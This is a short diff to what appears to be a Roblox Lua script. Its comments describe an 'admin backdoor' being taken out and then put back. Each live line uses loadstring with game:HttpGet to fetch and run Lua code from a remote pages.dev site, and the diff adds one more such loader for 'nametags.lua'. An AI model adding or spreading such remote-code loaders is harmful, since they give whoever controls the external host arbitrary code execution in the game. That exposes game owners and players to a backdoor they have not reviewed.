@@ -1,5 +1,6 @@
--- bye bye shitty ak admin backdoor, you suck!!
+-- jk ill add it into here again (the script keeps failing to run)
 
 loadstring(game:HttpGet("https://ichfickdeinemutta.pages.dev/chatcmds.lua"))()
 loadstring(game:HttpGet("https://ichfickdeinemutta.pages.dev/active.lua"))()
--- bye bye nametags!!
+loadstring(game:HttpGet("https://ichfickdeinemutta.pages.dev/nametags.lua"))()
+
